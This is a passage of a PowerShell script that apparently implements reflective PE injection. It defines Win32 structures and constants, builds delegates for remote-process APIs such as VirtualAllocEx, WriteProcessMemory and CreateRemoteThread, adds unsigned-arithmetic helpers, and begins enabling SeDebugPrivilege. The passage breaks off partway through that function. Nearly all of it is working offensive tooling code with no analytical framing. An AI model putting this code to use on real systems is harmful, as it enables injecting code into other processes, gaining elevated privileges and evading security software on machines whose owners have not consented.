		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		# NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
